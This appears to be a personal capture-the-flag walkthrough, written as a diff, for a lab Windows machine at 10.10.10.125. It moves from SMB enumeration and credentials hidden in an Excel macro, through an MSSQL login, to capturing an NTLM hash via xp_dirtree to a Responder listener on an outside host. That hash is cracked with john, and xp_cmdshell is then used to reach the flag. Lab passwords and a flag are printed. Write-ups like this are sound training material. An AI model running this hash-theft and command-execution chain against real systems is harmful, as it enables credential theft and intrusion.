@@ -1,0 +1,95 @@
+#10.10.10.125
+#PORT- 135, 139, 445, 1433, 5985, 47001 ...........
+
+#nmap - full tcp scan
+#dirb
+
+#enumrate smb
+smbclient -L 10.10.10.125
+#found shared folder  -->  Reports
+
+smbclient -H \\\\10.10.10.125\\Reports
+#found one file  -->  "Currency Volume Report.xlsm"
+#run
+binwalk "Currency Volume Report.xlsm"
+#found there are some folder and files
+#change extension .xlsm to .xl and extract file
+#use binwalk to check 'vbaProject.bin' file
+binwalk -W vbaProject.bin
+	AND
+hexdump -C vbaProject.bin
+	AND
+xxd -b vbaProject.bin
+
+#found some credentials
+#server=QUERIER
+#Database=volume
+#Uid=reporting
+#passwd= PcwTWTHRwryjc$c6
+
+------------------------------
+#enumrate port 1433
+nmap -p 445 --script ms-sql-info 10.10.10.125
+		OR
+nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 10.10.10.125
+#found there is mssql (Microsoft SQL Server)
+
+#download mssqlclient.py from impacket
+>>>https://www.secureauth.com/labs/open-source-tools/impacket 
+#Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself.
+#Impacket has a mssqlclient.py that can be used to login to the server to execute raw SQL commands.
+
+#now run this 
+python mssqlclient.py -windows-auth -db volume QUERIER/reporting@10.10.10.125
+#passwd= PcwTWTHRwryjc$c6
+
+#Got SQL shell
+#start listner with responder
+responder -i 10.10.15.79 -I tun0 -r On -v -f On
+
+#now run the cmd in SQL shell
+>>>https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/
+#you can check help and may need to enable xp_cmdshell 
+;declare @q varchar(99);set @q='\\10.10.15.79\test'; exec master.dbo.xp_dirtree @q
+
+ 
+#got the username and hash on responder
+#Put hash into one file(hash.txt) and crack using john
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+#found cracked value
+#PASSWD= corporate568
+#USER= QUERIER\mssql-svc   (mssql-svc)
+
+#metasploit
+*************************************************
+#we can identify these credentials by using scanner script from metasploit
+#metasploit:- auxiliary/scanner/mssql/mssql_login
+#use 'passwd.list' and 'user.list'
+#so these are the right credentials
+--------------------------
+#there is exploit in  metasploit for port 1433(mssql)
+#metasploit:- exploit/windows/mssql/mssql_payload
+>>>https://www.cybrary.it/0p3n/exploiting-ms-sql-server-metasploit-fast-track/
+#but this didn't work
+*************************************************
+
+#we can login to SQL shell with 'mssql-svc' and run the cmd with 'xp_cmdshell'
+python mssqlclient.py -windows-auth -db volume QUERIER/mssql-svc@10.10.10.125
+#PASSWD= corporate568
+help
+enable_xp_cmdshell
+xp_cmdshell "whoami"
+xp_cmdshell "type c:\users\mssql-svc\desktop\user.txt"
+
+	OR
+#use mssql_shell.py		(used)
+>>>https://github.com/Alamot/code-snippets/tree/master/
+#check mssql_shell.py file
+#change MSSQL_SERVER, MSSQL_USERNAME, MSSQL_PASSWORD inside mssql_shell.py file
+python mssql_shell.py
+
+#Got shell
+
+#key
+c37b41bb669da345bb14de50faab3c16
+
